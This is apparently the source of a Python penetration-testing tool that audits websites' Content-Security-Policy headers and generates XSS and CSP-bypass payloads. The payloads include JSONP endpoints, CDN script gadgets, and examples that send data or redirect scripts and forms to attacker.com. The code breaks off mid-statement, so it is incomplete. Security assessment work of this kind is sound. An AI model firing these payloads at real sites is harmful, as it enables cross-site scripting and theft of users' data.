#!/usr/bin/env python3
"""
CSP Analyzer - Content Security Policy Security Assessment Tool
================================================================

A comprehensive Content Security Policy analyzer that fetches, parses, and
evaluates CSP headers for misconfigurations, identifies bypass opportunities
through whitelisted JSONP endpoints and CDN script gadgets, and generates
ready-to-use bypass payloads.

Features:
- Fetches and parses CSP from HTTP headers and meta tags
- Identifies all directive misconfigurations (unsafe-inline, unsafe-eval, data:, etc.)
- Checks whitelisted domains for known JSONP callback endpoints
- Checks whitelisted CDNs for exploitable script gadgets (AngularJS, RequireJS, etc.)
- Detects nonce/hash implementation weaknesses
- Evaluates base-uri, form-action, and frame-ancestors gaps
- Generates specific bypass payloads for each identified weakness
- JSON and text output formats
- Proxy support

Usage:
    python3 csp-analyzer.py -u "https://target.com"
    python3 csp-analyzer.py -u "https://target.com" --bypass --check-jsonp --check-gadgets
    python3 csp-analyzer.py -u "https://target.com" --bypass --output json -o report.json

Author: Security Research Team
License: For authorized security testing only

NOTE: This security testing tool generates CSP bypass payloads containing
dangerous JavaScript patterns as test vectors for authorized penetration
testing engagements. The tool itself never executes these payloads.
"""

import argparse
import json
import re
import sys
import urllib.parse
from dataclasses import dataclass, asdict, field
from typing import Dict, List, Optional, Set, Tuple, Any
from datetime import datetime
import warnings

try:
    import requests
    from bs4 import BeautifulSoup
except ImportError:
    print("[-] Required dependencies: pip install requests beautifulsoup4")
    sys.exit(1)

warnings.filterwarnings('ignore', message='Unverified HTTPS request')

# ============================================================================
# CONFIGURATION
# ============================================================================

DEFAULT_USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
DEFAULT_TIMEOUT = 15

# ============================================================================
# TERMINAL COLORS
# ============================================================================

class Colors:
    """ANSI color codes for terminal output."""
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    END = '\033[0m'

    @staticmethod
    def disable():
        for attr in ['RED', 'GREEN', 'YELLOW', 'BLUE', 'MAGENTA', 'CYAN', 'WHITE', 'BOLD', 'END']:
            setattr(Colors, attr, '')


class Logger:
    """Logging utility with colored output."""
    verbose = False

    @staticmethod
    def info(msg: str):
        print(f"{Colors.BLUE}[*]{Colors.END} {msg}")

    @staticmethod
    def success(msg: str):
        print(f"{Colors.GREEN}[+]{Colors.END} {msg}")

    @staticmethod
    def warning(msg: str):
        print(f"{Colors.YELLOW}[!]{Colors.END} {msg}")

    @staticmethod
    def error(msg: str):
        print(f"{Colors.RED}[-]{Colors.END} {msg}")

    @staticmethod
    def vuln(msg: str):
        print(f"{Colors.RED}{Colors.BOLD}[VULN]{Colors.END} {msg}")

    @staticmethod
    def debug(msg: str):
        if Logger.verbose:
            print(f"{Colors.CYAN}[D]{Colors.END} {msg}")


# ============================================================================
# DATA STRUCTURES
# ============================================================================

@dataclass
class CSPDirective:
    """A parsed CSP directive with its source list."""
    name: str
    sources: List[str]
    raw: str

@dataclass
class CSPWeakness:
    """An identified CSP weakness or misconfiguration."""
    directive: str
    weakness_type: str       # misconfiguration, bypass, missing, informational
    severity: str            # critical, high, medium, low, info
    description: str
    detail: str
    bypass_payloads: List[str] = field(default_factory=list)
    remediation: str = ""

@dataclass
class JSONPEndpoint:
    """A discovered JSONP endpoint on a whitelisted domain."""
    domain: str
    url: str
    callback_param: str
    verified: bool
    response_snippet: str = ""

@dataclass
class ScriptGadget:
    """A discovered script gadget on a whitelisted CDN."""
    domain: str
    library: str
    version: str
    gadget_type: str
    exploit_url: str
    bypass_payload: str


# ============================================================================
# KNOWN JSONP ENDPOINTS DATABASE
# ============================================================================

KNOWN_JSONP_ENDPOINTS = {
    "google.com": [
        {"url": "https://accounts.google.com/o/oauth2/revoke?callback={cb}", "param": "callback"},
        {"url": "https://www.google.com/complete/search?client=chrome&q=test&callback={cb}", "param": "callback"},
    ],
    "googleapis.com": [
        {"url": "https://ajax.googleapis.com/ajax/services/search/web?v=1.0&q=test&callback={cb}", "param": "callback"},
        {"url": "https://maps.googleapis.com/maps/api/js?callback={cb}", "param": "callback"},
        {"url": "https://www.googleapis.com/customsearch/v1?callback={cb}", "param": "callback"},
    ],
    "gstatic.com": [
        {"url": "https://www.gstatic.com/charts/loader.js", "param": "callback"},
    ],
    "facebook.com": [
        {"url": "https://www.facebook.com/plugins/like.php?callback={cb}", "param": "callback"},
    ],
    "graph.facebook.com": [
        {"url": "https://graph.facebook.com/me?callback={cb}", "param": "callback"},
    ],
    "yahoo.com": [
        {"url": "https://search.yahoo.com/sugg/gossip/gossip-us-ura/?output=sd1&callback={cb}", "param": "callback"},
    ],
    "yandex.ru": [
        {"url": "https://suggest.yandex.ru/suggest-ya.cgi?callback={cb}", "param": "callback"},
    ],
    "twitter.com": [
        {"url": "https://syndication.twitter.com/timeline/likes?callback={cb}", "param": "callback"},
    ],
    "twimg.com": [
        {"url": "https://syndication.twimg.com/widgets/followbutton/info.json?callback={cb}", "param": "callback"},
    ],
    "youtube.com": [
        {"url": "https://www.youtube.com/oembed?url=https://www.youtube.com/watch?v=dQw4w9WgXcQ&format=json&callback={cb}", "param": "callback"},
    ],
    "cdnjs.cloudflare.com": [
        {"url": "https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.0/angular.min.js", "param": ""},
    ],
    "jsdelivr.net": [
        {"url": "https://cdn.jsdelivr.net/npm/angular@1.6.0/angular.min.js", "param": ""},
    ],
    "unpkg.com": [
        {"url": "https://unpkg.com/angular@1.6.0/angular.min.js", "param": ""},
    ],
    "linkedin.com": [
        {"url": "https://www.linkedin.com/countserv/count/share?url=https://example.com&callback={cb}", "param": "callback"},
    ],
    "pinterest.com": [
        {"url": "https://api.pinterest.com/v1/urls/count.json?callback={cb}&url=https://example.com", "param": "callback"},
    ],
}

# ============================================================================
# KNOWN CDN SCRIPT GADGETS DATABASE
# ============================================================================

KNOWN_SCRIPT_GADGETS = {
    "cdnjs.cloudflare.com": [
        {
            "library": "AngularJS",
            "versions": ["1.0.0", "1.1.0", "1.2.0", "1.3.0", "1.4.0", "1.5.0", "1.6.0", "1.6.9"],
            "gadget_type": "CSTI to XSS",
            "url_template": "https://cdnjs.cloudflare.com/ajax/libs/angular.js/{ver}/angular.min.js",
            "bypass": "<script src=\"https://cdnjs.cloudflare.com/ajax/libs/angular.js/{ver}/angular.min.js\"></script><div ng-app>{{constructor.constructor('alert(document.domain)')()\u007d\u007d</div>",
        },
        {
            "library": "Prototype.js",
            "versions": ["1.7.3", "1.7.2"],
            "gadget_type": "DOM clobbering + script execution",
            "url_template": "https://cdnjs.cloudflare.com/ajax/libs/prototype/{ver}/prototype.min.js",
            "bypass": "<script src=\"https://cdnjs.cloudflare.com/ajax/libs/prototype/{ver}/prototype.min.js\"></script><img id=\"__proto__\" src=\"data:,alert(1)\">",
        },
        {
            "library": "MooTools",
            "versions": ["1.6.0", "1.5.2"],
            "gadget_type": "Prototype pollution to XSS",
            "url_template": "https://cdnjs.cloudflare.com/ajax/libs/mootools/{ver}/mootools-core.min.js",
            "bypass": "<script src=\"https://cdnjs.cloudflare.com/ajax/libs/mootools/{ver}/mootools-core.min.js\"></script>",
        },
        {
            "library": "Dojo Toolkit",
            "versions": ["1.14.0", "1.13.0"],
            "gadget_type": "Module loading to XSS",
            "url_template": "https://cdnjs.cloudflare.com/ajax/libs/dojo/{ver}/dojo.min.js",
            "bypass": "<script src=\"https://cdnjs.cloudflare.com/ajax/libs/dojo/{ver}/dojo.min.js\" data-dojo-config=\"has: {'host-browser': 1}, isDebug: 1, locale: '../../../attacker.com/xss'\"></script>",
        },
        {
            "library": "Ember.js (debug)",
            "versions": ["2.18.0", "3.0.0"],
            "gadget_type": "Template injection",
            "url_template": "https://cdnjs.cloudflare.com/ajax/libs/ember.js/{ver}/ember.debug.js",
            "bypass": "<script src=\"https://cdnjs.cloudflare.com/ajax/libs/ember.js/{ver}/ember.debug.js\"></script>",
        },
        {
            "library": "Underscore.js",
            "versions": ["1.12.0", "1.13.0"],
            "gadget_type": "Template injection",
            "url_template": "https://cdnjs.cloudflare.com/ajax/libs/underscore.js/{ver}/underscore-min.js",
            "bypass": "<script src=\"https://cdnjs.cloudflare.com/ajax/libs/underscore.js/{ver}/underscore-min.js\"></script>",
        },
    ],
    "cdn.jsdelivr.net": [
        {
            "library": "AngularJS",
            "versions": ["1.6.0", "1.6.9", "1.5.11"],
            "gadget_type": "CSTI to XSS",
            "url_template": "https://cdn.jsdelivr.net/npm/angular@{ver}/angular.min.js",
            "bypass": "<script src=\"https://cdn.jsdelivr.net/npm/angular@{ver}/angular.min.js\"></script><div ng-app>{{constructor.constructor('alert(document.domain)')()\u007d\u007d</div>",
        },
        {
            "library": "RequireJS",
            "versions": ["2.3.6", "2.3.5"],
            "gadget_type": "Module loading to XSS",
            "url_template": "https://cdn.jsdelivr.net/npm/requirejs@{ver}/require.min.js",
            "bypass": "<script src=\"https://cdn.jsdelivr.net/npm/requirejs@{ver}/require.min.js\" data-main=\"data:,alert(1)\"></script>",
        },
    ],
    "unpkg.com": [
        {
            "library": "AngularJS",
            "versions": ["1.6.0", "1.6.9"],
            "gadget_type": "CSTI to XSS",
            "url_template": "https://unpkg.com/angular@{ver}/angular.min.js",
            "bypass": "<script src=\"https://unpkg.com/angular@{ver}/angular.min.js\"></script><div ng-app>{{constructor.constructor('alert(document.domain)')()\u007d\u007d</div>",
        },
    ],
    "ajax.googleapis.com": [
        {
            "library": "AngularJS",
            "versions": ["1.6.0", "1.6.9", "1.5.11"],
            "gadget_type": "CSTI to XSS",
            "url_template": "https://ajax.googleapis.com/ajax/libs/angularjs/{ver}/angular.min.js",
            "bypass": "<script src=\"https://ajax.googleapis.com/ajax/libs/angularjs/{ver}/angular.min.js\"></script><div ng-app>{{constructor.constructor('alert(document.domain)')()\u007d\u007d</div>",
        },
    ],
    "code.jquery.com": [
        {
            "library": "jQuery (old versions)",
            "versions": ["1.12.4", "1.11.3", "2.2.4"],
            "gadget_type": "Selector-based XSS",
            "url_template": "https://code.jquery.com/jquery-{ver}.min.js",
            "bypass": "<script src=\"https://code.jquery.com/jquery-{ver}.min.js\"></script>",
        },
    ],
}

# Broad wildcard / overly permissive source patterns
BROAD_WHITELISTS = [
    "*.google.com",
    "*.googleapis.com",
    "*.gstatic.com",
    "*.facebook.com",
    "*.fbcdn.net",
    "*.twitter.com",
    "*.twimg.com",
    "*.cloudflare.com",
    "*.cloudfront.net",
    "*.amazonaws.com",
    "*.azureedge.net",
    "*.akamaihd.net",
    "*.akamai.net",
    "*.fastly.net",
    "*.jsdelivr.net",
    "*.unpkg.com",
    "*.rawgit.com",
    "*.raw.githubusercontent.com",
    "*.github.io",
    "*.herokuapp.com",
    "*.firebaseapp.com",
    "*.storage.googleapis.com",
]

# CSP keyword constants
CSP_UNSAFE_INLINE = "'unsafe-inline'"
CSP_UNSAFE_EVAL = "'unsafe-eval'"
CSP_STRICT_DYNAMIC = "'strict-dynamic'"
CSP_NONE = "'none'"


# ============================================================================
# CSP PARSER
# ============================================================================

class CSPParser:
    """Parses Content Security Policy strings into structured directives."""

    VALID_DIRECTIVES = {
        'default-src', 'script-src', 'style-src', 'img-src', 'font-src',
        'connect-src', 'media-src', 'object-src', 'frame-src', 'child-src',
        'worker-src', 'frame-ancestors', 'form-action', 'base-uri',
        'manifest-src', 'prefetch-src', 'navigate-to', 'plugin-types',
        'sandbox', 'upgrade-insecure-requests', 'block-all-mixed-content',
        'report-uri', 'report-to', 'require-trusted-types-for',
        'trusted-types', 'script-src-elem', 'script-src-attr',
        'style-src-elem', 'style-src-attr',
    }

    @staticmethod
    def parse(csp_string: str) -> List[CSPDirective]:
        """Parse a CSP header string into directive objects."""
        directives = []
        if not csp_string:
            return directives

        for part in csp_string.split(';'):
            part = part.strip()
            if not part:
                continue

            tokens = part.split()
            if not tokens:
                continue

            name = tokens[0].lower()
            sources = tokens[1:] if len(tokens) > 1 else []

            directives.append(CSPDirective(
                name=name,
                sources=sources,
                raw=part,
            ))

        return directives

    @staticmethod
    def get_effective_sources(directives: List[CSPDirective], directive_name: str) -> List[str]:
        """Get effective sources for a directive, falling back to default-src."""
        for d in directives:
            if d.name == directive_name:
                return d.sources

        # Fall back to default-src
        for d in directives:
            if d.name == 'default-src':
                return d.sources

        return []


# ============================================================================
# CSP FETCHER
# ============================================================================

class CSPFetcher:
    """Fetches CSP from HTTP headers and HTML meta tags."""

    def __init__(self, timeout: int = DEFAULT_TIMEOUT, proxy: Optional[str] = None,
                 headers: Optional[Dict] = None, cookies: Optional[Dict] = None):
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': DEFAULT_USER_AGENT})
        self.session.verify = False
        self.timeout = timeout

        if headers:
            self.session.headers.update(headers)
        if cookies:
            self.session.cookies.update(cookies)
        if proxy:
            self.session.proxies = {'http': proxy, 'https': proxy}

    def fetch(self, url: str) -> Tuple[Optional[str], Optional[str], Optional[str]]:
        """Fetch CSP from a URL. Returns (csp_header, csp_report_only, csp_meta_tag)."""
        try:
            resp = self.session.get(url, timeout=self.timeout)

            csp_header = resp.headers.get('Content-Security-Policy', '')
            csp_report = resp.headers.get('Content-Security-Policy-Report-Only', '')

            # Also check meta tags
            csp_meta = ''
            if resp.text:
                soup = BeautifulSoup(resp.text, 'html.parser')
                meta = soup.find('meta', attrs={'http-equiv': re.compile(r'content-security-policy', re.I)})
                if meta and meta.get('content'):
                    csp_meta = meta['content']

            return (csp_header, csp_report, csp_meta)

        except requests.RequestException as e:
            Logger.error(f"Failed to fetch {url}: {e}")
            return (None, None, None)


# ============================================================================
# CSP ANALYZER ENGINE
# ============================================================================

class CSPAnalyzer:
    """Analyzes CSP directives for weaknesses and bypass opportunities."""

    def __init__(self, check_jsonp: bool = False, check_gadgets: bool = False,
                 generate_bypass: bool = False, timeout: int = DEFAULT_TIMEOUT,
                 proxy: Optional[str] = None):
        self.check_jsonp = check_jsonp
        self.check_gadgets = check_gadgets
        self.generate_bypass = generate_bypass
        self.timeout = timeout
        self.proxy = proxy

        self.session = requests.Session()
        self.session.headers.update({'User-Agent': DEFAULT_USER_AGENT})
        self.session.verify = False
        if proxy:
            self.session.proxies = {'http': proxy, 'https': proxy}

    def analyze(self, csp_string: str, target_url: str = "") -> Tuple[List[CSPWeakness], List[CSPDirective]]:
        """Perform full CSP analysis. Returns (weaknesses, parsed_directives)."""
        directives = CSPParser.parse(csp_string)
        weaknesses = []

        if not directives:
            weaknesses.append(CSPWeakness(
                directive="(none)",
                weakness_type="missing",
                severity="high",
                description="No CSP policy found",
                detail="The server does not set a Content-Security-Policy header. All script sources are allowed.",
                bypass_payloads=["<script>alert(document.domain)</script>"] if self.generate_bypass else [],
                remediation="Implement a Content-Security-Policy header with restrictive directives.",
            ))
            return weaknesses, directives

        # Check individual directives
        weaknesses.extend(self._check_unsafe_inline(directives))
        weaknesses.extend(self._check_unsafe_dynamic_exec(directives))
        weaknesses.extend(self._check_data_uri(directives))
        weaknesses.extend(self._check_blob_uri(directives))
        weaknesses.extend(self._check_wildcard(directives))
        weaknesses.extend(self._check_broad_whitelists(directives))
        weaknesses.extend(self._check_missing_directives(directives))
        weaknesses.extend(self._check_nonce_hash(directives))
        weaknesses.extend(self._check_base_uri(directives))
        weaknesses.extend(self._check_form_action(directives))
        weaknesses.extend(self._check_frame_ancestors(directives))
        weaknesses.extend(self._check_object_src(directives))
        weaknesses.extend(self._check_strict_dynamic(directives))
        weaknesses.extend(self._check_http_sources(directives, target_url))

        # External checks
        if self.check_jsonp:
            weaknesses.extend(self._check_jsonp_endpoints(directives))

        if self.check_gadgets:
            weaknesses.extend(self._check_script_gadgets(directives))

        return weaknesses, directives

    def _get_script_sources(self, directives: List[CSPDirective]) -> List[str]:
        """Get effective script sources."""
        return CSPParser.get_effective_sources(directives, 'script-src')

    def _check_unsafe_inline(self, directives: List[CSPDirective]) -> List[CSPWeakness]:
        """Check for 'unsafe-inline' in script-src."""
        weaknesses = []
        sources = self._get_script_sources(directives)

        if CSP_UNSAFE_INLINE in sources:
            # Check if nonce or hash is also present (overrides unsafe-inline in CSP3)
            has_nonce = any(s.startswith("'nonce-") for s in sources)
            has_hash = any(s.startswith("'sha256-") or s.startswith("'sha384-") or s.startswith("'sha512-") for s in sources)
            has_strict_dynamic = CSP_STRICT_DYNAMIC in sources

            if has_nonce or has_hash or has_strict_dynamic:
                weaknesses.append(CSPWeakness(
                    directive="script-src",
                    weakness_type="informational",
                    severity="info",
                    description="'unsafe-inline' present but overridden by nonce/hash/strict-dynamic",
                    detail=(
                        "The 'unsafe-inline' directive is present but is ignored by CSP3-compliant browsers "
                        "when a nonce or hash is also specified. Legacy browsers may still honor it."
                    ),
                    bypass_payloads=(
                        ["<script>alert(document.domain)</script> (works only in CSP2 browsers)"]
                        if self.generate_bypass else []
                    ),
                    remediation="Remove 'unsafe-inline' for defense-in-depth. It is safely overridden in CSP3 but keep policy clean.",
                ))
            else:
                weaknesses.append(CSPWeakness(
                    directive="script-src",
                    weakness_type="misconfiguration",
                    severity="critical",
                    description="'unsafe-inline' allows arbitrary inline script execution",
                    detail=(
                        "The script-src directive includes 'unsafe-inline', which allows any inline "
                        "<script> block, event handler, or javascript: URL to execute. "
                        "This completely defeats CSP protection against XSS."
                    ),
                    bypass_payloads=[
                        "<script>alert(document.domain)</script>",
                        "<img src=x onerror=alert(document.domain)>",
                        "<svg onload=alert(document.domain)>",
                        "<body onload=alert(document.domain)>",
                    ] if self.generate_bypass else [],
                    remediation="Remove 'unsafe-inline' and use nonce-based or hash-based CSP instead.",
                ))

        # Check style-src too
        style_sources = CSPParser.get_effective_sources(directives, 'style-src')
        if CSP_UNSAFE_INLINE in style_sources:
            weaknesses.append(CSPWeakness(
                directive="style-src",
                weakness_type="misconfiguration",
                severity="medium",
                description="'unsafe-inline' in style-src allows CSS injection",
                detail=(
                    "The style-src directive includes 'unsafe-inline'. While less severe than script-src, "
                    "this allows CSS injection which can enable data exfiltration via CSS selectors."
                ),
                bypass_payloads=[
                    "<style>body{background:url('https://attacker.com/exfil?data=stolen')}</style>",
                ] if self.generate_bypass else [],
                remediation="Remove 'unsafe-inline' from style-src and use nonces or hashes for styles.",
            ))

        return weaknesses

    def _check_unsafe_dynamic_exec(self, directives: List[CSPDirective]) -> List[CSPWeakness]:
        """Check for CSP_UNSAFE_EVAL in script-src (allows dynamic code execution)."""
        weaknesses = []
        sources = self._get_script_sources(directives)

        if CSP_UNSAFE_EVAL in sources:
            weaknesses.append(CSPWeakness(
                directive="script-src",
                weakness_type="misconfiguration",
                severity="high",
                description=f"{CSP_UNSAFE_EVAL} allows dynamic code execution",
                detail=(
                    f"The script-src includes {CSP_UNSAFE_EVAL}, allowing dynamic code execution "
                    f"functions like setTimeout(string) and setInterval(string). "
                    f"If any reflected or stored data reaches these sinks, XSS is achievable."
                ),
                bypass_payloads=[
                    "setTimeout('alert(document.domain)',0)",
                ] if self.generate_bypass else [],
                remediation=f"Remove {CSP_UNSAFE_EVAL}. Refactor code to avoid dynamic code execution and string-based timer functions.",
            ))

        return weaknesses

    def _check_data_uri(self, directives: List[CSPDirective]) -> List[CSPWeakness]:
        """Check for data: URI in script-src and object-src."""
        weaknesses = []
        script_sources = self._get_script_sources(directives)
        object_sources = CSPParser.get_effective_sources(directives, 'object-src')

        if "data:" in script_sources:
            weaknesses.append(CSPWeakness(
                directive="script-src",
                weakness_type="misconfiguration",
                severity="critical",
                description="data: URI in script-src allows inline script execution",
                detail="The data: URI scheme in script-src allows loading scripts from data: URLs, bypassing CSP.",
                bypass_payloads=[
                    '<script src="data:text/javascript,alert(document.domain)"></script>',
                    '<script src="data:text/javascript;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="></script>',
                ] if self.generate_bypass else [],
                remediation="Remove data: from script-src. Use nonces or hashes for inline scripts.",
            ))

        if "data:" in object_sources:
            weaknesses.append(CSPWeakness(
                directive="object-src",
                weakness_type="misconfiguration",
                severity="high",
                description="data: URI in object-src allows plugin-based script execution",
                detail="The data: URI in object-src can be exploited with object/embed tags to execute scripts.",
                bypass_payloads=[
                    '<object data="data:text/html,<script>alert(document.domain)</script>">',
                ] if self.generate_bypass else [],
                remediation="Set object-src to 'none' unless plugins are explicitly required.",
            ))

        return weaknesses

    def _check_blob_uri(self, directives: List[CSPDirective]) -> List[CSPWeakness]:
        """Check for blob: URI in script-src."""
        weaknesses = []
        sources = self._get_script_sources(directives)

        if "blob:" in sources:
            weaknesses.append(CSPWeakness(
                directive="script-src",
                weakness_type="misconfiguration",
                severity="high",
                description="blob: URI in script-src allows Blob-based script execution",
                detail="The blob: URI scheme allows creating and executing JavaScript via Blob URLs.",
                bypass_payloads=[
                    "var b=new Blob(['alert(document.domain)'],{type:'text/javascript'});"
                    "var u=URL.createObjectURL(b);var s=document.createElement('script');"
                    "s.src=u;document.head.appendChild(s);",
                ] if self.generate_bypass else [],
                remediation="Remove blob: from script-src. If Workers need blob:, use worker-src separately.",
            ))

        return weaknesses

    def _check_wildcard(self, directives: List[CSPDirective]) -> List[CSPWeakness]:
        """Check for * (wildcard) in critical directives."""
        weaknesses = []
        critical_directives = ['script-src', 'default-src', 'object-src', 'base-uri']

        for d in directives:
            if d.name in critical_directives and '*' in d.sources:
                weaknesses.append(CSPWeakness(
                    directive=d.name,
                    weakness_type="misconfiguration",
                    severity="critical" if d.name in ('script-src', 'default-src') else "high",
                    description=f"Wildcard (*) in {d.name} allows loading from any origin",
                    detail=f"The {d.name} directive includes *, allowing resources from any origin.",
                    bypass_payloads=[
                        '<script src="https://attacker.com/evil.js"></script>',
                    ] if self.generate_bypass else [],
                    remediation=f"Replace * with specific trusted origins in {d.name}.",
                ))

        return weaknesses

    def _check_broad_whitelists(self, directives: List[CSPDirective]) -> List[CSPWeakness]:
        """Check for overly broad domain whitelists."""
        weaknesses = []
        script_sources = self._get_script_sources(directives)

        for source in script_sources:
            source_lower = source.lower()
            for broad in BROAD_WHITELISTS:
                broad_domain = broad.lstrip('*.')
                if source_lower == broad or source_lower.endswith('.' + broad_domain) or source_lower == broad_domain:
                    weaknesses.append(CSPWeakness(
                        directive="script-src",
                        weakness_type="misconfiguration",
                        severity="high",
                        description=f"Broad whitelist '{source}' in script-src",
                        detail=(
                            f"The domain '{source}' hosts user-uploadable content, JSONP endpoints, "
                            f"or CDN libraries that can be abused for CSP bypass. "
                            f"Attackers can host malicious scripts or find JSONP callbacks on these domains."
                        ),
                        remediation=f"Replace '{source}' with specific, narrow paths or use nonce/hash-based CSP.",
                    ))
                    break

        return weaknesses

    def _check_missing_directives(self, directives: List[CSPDirective]) -> List[CSPWeakness]:
        """Check for missing critical directives."""
        weaknesses = []
        directive_names = {d.name for d in directives}

        if 'script-src' not in directive_names and 'default-src' not in directive_names:
            weaknesses.append(CSPWeakness(
                directive="script-src",
                weakness_type="missing",
                severity="critical",
                description="Missing script-src and default-src - scripts load from any origin",
                detail="Without script-src or default-src, browsers allow scripts from any source.",
                bypass_payloads=[
                    '<script src="https://attacker.com/evil.js"></script>',
                ] if self.generate_bypass else [],
                remediation="Add a script-src directive with specific trusted origins.",
            ))

        if 'object-src' not in directive_names and 'default-src' not in directive_names:
            weaknesses.append(CSPWeakness(
                directive="object-src",
                weakness_type="missing",
                severity="high",
                description="Missing object-src - plugins can load from any origin",
                detail="Without object-src, object/embed/applet tags can load content from any source.",
                bypass_payloads=[
                    '<object data="data:text/html,<script>alert(document.domain)</script>">',
                ] if self.generate_bypass else [],
                remediation="Add object-src 'none' to block plugin-based content.",
            ))

        return weaknesses

    def _check_nonce_hash(self, directives: List[CSPDirective]) -> List[CSPWeakness]:
        """Check nonce and hash implementations for weaknesses."""
        weaknesses = []
        sources = self._get_script_sources(directives)

        nonces = [s for s in sources if s.startswith("'nonce-")]

        for nonce in nonces:
            nonce_value = nonce.replace("'nonce-", "").rstrip("'")
            if len(nonce_value) < 16:
                weaknesses.append(CSPWeakness(
                    directive="script-src",
                    weakness_type="misconfiguration",
                    severity="high",
                    description=f"Short nonce value detected ({len(nonce_value)} chars)",
                    detail=(
                        f"The nonce '{nonce_value}' is only {len(nonce_value)} characters. "
                        f"Nonces should be at least 128 bits (16 bytes / ~22 base64 chars) of cryptographic randomness."
                    ),
                    remediation="Use a cryptographically random nonce of at least 128 bits, regenerated per request.",
                ))

            if nonce_value in ('nonce', 'test', '123', 'abc', 'static', 'fixed'):
                weaknesses.append(CSPWeakness(
                    directive="script-src",
                    weakness_type="misconfiguration",
                    severity="critical",
                    description="Static/predictable nonce detected",
                    detail=(
                        f"The nonce value '{nonce_value}' appears to be static or predictable. "
                        f"Nonces MUST be unique per response and cryptographically random."
                    ),
                    bypass_payloads=[
                        f'<script nonce="{nonce_value}">alert(document.domain)</script>',
                    ] if self.generate_bypass else [],
                    remediation="Regenerate the nonce on every response using a CSPRNG.",
                ))

        return weaknesses

    def _check_base_uri(self, directives: List[CSPDirective]) -> List[CSPWeakness]:
        """Check for missing or permissive base-uri."""
        weaknesses = []
        directive_names = {d.name for d in directives}

        if 'base-uri' not in directive_names:
            weaknesses.append(CSPWeakness(
                directive="base-uri",
                weakness_type="missing",
                severity="high",
                description="Missing base-uri allows base tag injection",
                detail=(
                    "Without a base-uri directive, an attacker can inject a <base> tag to redirect "
                    "relative script URLs to an attacker-controlled server."
                ),
                bypass_payloads=[
                    '<base href="https://attacker.com/">',
                ] if self.generate_bypass else [],
                remediation="Add base-uri 'self' or base-uri 'none' to prevent base tag injection.",
            ))
        else:
            base_sources = CSPParser.get_effective_sources(directives, 'base-uri')
            if '*' in base_sources:
                weaknesses.append(CSPWeakness(
                    directive="base-uri",
                    weakness_type="misconfiguration",
                    severity="high",
                    description="Wildcard in base-uri allows base tag hijacking",
                    detail="base-uri * allows injecting a <base> tag pointing to any origin.",
                    bypass_payloads=[
                        '<base href="https://attacker.com/">',
                    ] if self.generate_bypass else [],
                    remediation="Set base-uri to 'self' or 'none'.",
                ))

        return weaknesses

    def _check_form_action(self, directives: List[CSPDirective]) -> List[CSPWeakness]:
        """Check for missing or permissive form-action."""
        weaknesses = []
        directive_names = {d.name for d in directives}

        if 'form-action' not in directive_names:
            weaknesses.append(CSPWeakness(
                directive="form-action",
                weakness_type="missing",
                severity="medium",
                description="Missing form-action allows form submissions to any origin",
                detail=(
                    "Without form-action, forms can submit data to any URL, enabling "
                    "phishing attacks via injected or modified forms."
                ),
                bypass_payloads=[
                    '<form action="https://attacker.com/steal"><input name="token" value="csrf_token"><button>Submit</button></form>',
                ] if self.generate_bypass else [],
                remediation="Add form-action 'self' to restrict form submissions to same origin.",
            ))

        return weaknesses

    def _check_frame_ancestors(self, directives: List[CSPDirective]) -> List[CSPWeakness]:
        """Check for missing frame-ancestors (clickjacking protection)."""
        weaknesses = []
        directive_names = {d.name for d in directives}

        if 'frame-ancestors' not in directive_names:
            weaknesses.append(CSPWeakness(
                directive="frame-ancestors",
                weakness_type="missing",
                severity="medium",
                description="Missing frame-ancestors - page may be frameable (clickjacking)",
                detail=(
                    "Without frame-ancestors, the page can be embedded in iframes on any origin, "
                    "potentially enabling clickjacking attacks."
                ),
                remediation="Add frame-ancestors 'self' or frame-ancestors 'none' to prevent framing.",
            ))

        return weaknesses

    def _check_object_src(self, directives: List[CSPDirective]) -> List[CSPWeakness]:
        """Check if object-src is properly restricted."""
        weaknesses = []
        object_sources = CSPParser.get_effective_sources(directives, 'object-src')

        if object_sources and CSP_NONE not in object_sources:
            has_permissive = any(s in ('*', 'data:', 'blob:') or not s.startswith("'") for s in object_sources)
            if has_permissive:
                weaknesses.append(CSPWeakness(
                    directive="object-src",
                    weakness_type="misconfiguration",
                    severity="medium",
                    description="Permissive object-src allows plugin-based content loading",
                    detail="object-src is not set to 'none', allowing potential plugin-based XSS vectors.",
                    bypass_payloads=[
                        '<embed src="data:text/html,<script>alert(document.domain)</script>">',
                    ] if self.generate_bypass else [],
                    remediation="Set object-src 'none' unless plugins are explicitly required.",
                ))

        return weaknesses

    def _check_strict_dynamic(self, directives: List[CSPDirective]) -> List[CSPWeakness]:
        """Check strict-dynamic usage and its implications."""
        weaknesses = []
        sources = self._get_script_sources(directives)

        if CSP_STRICT_DYNAMIC in sources:
            has_nonce = any(s.startswith("'nonce-") for s in sources)
            has_hash = any(s.startswith("'sha256-") or s.startswith("'sha384-") or s.startswith("'sha512-") for s in sources)

            if not has_nonce and not has_hash:
                weaknesses.append(CSPWeakness(
                    directive="script-src",
                    weakness_type="misconfiguration",
                    severity="critical",
                    description="'strict-dynamic' without nonce or hash is ineffective",
                    detail=(
                        "'strict-dynamic' requires a nonce or hash to be useful. Without one, "
                        "the browser behavior is undefined and may fall back to default behavior."
                    ),
                    remediation="Add a nonce or hash alongside 'strict-dynamic'.",
                ))
            else:
                weaknesses.append(CSPWeakness(
                    directive="script-src",
                    weakness_type="informational",
                    severity="info",
                    description="'strict-dynamic' with nonce/hash - host-based allowlists ignored",
                    detail=(
                        "'strict-dynamic' causes browsers to ignore host-based and scheme-based source expressions. "
                        "Only nonce/hash-matched scripts and their dynamically created children are allowed. "
                        "If a trusted script creates DOM elements from user input, XSS may still be possible."
                    ),
                    remediation="Ensure nonce-trusted scripts do not create script elements from user input.",
                ))

        return weaknesses

    def _check_http_sources(self, directives: List[CSPDirective], target_url: str) -> List[CSPWeakness]:
        """Check for HTTP (non-HTTPS) sources when the page is served over HTTPS."""
        weaknesses = []

        if not target_url.startswith('https://'):
            return weaknesses

        for d in directives:
            if d.name in ('script-src', 'default-src', 'style-src', 'img-src', 'connect-src'):
                http_sources = [s for s in d.sources if s.startswith('http://')]
                if http_sources:
                    weaknesses.append(CSPWeakness(
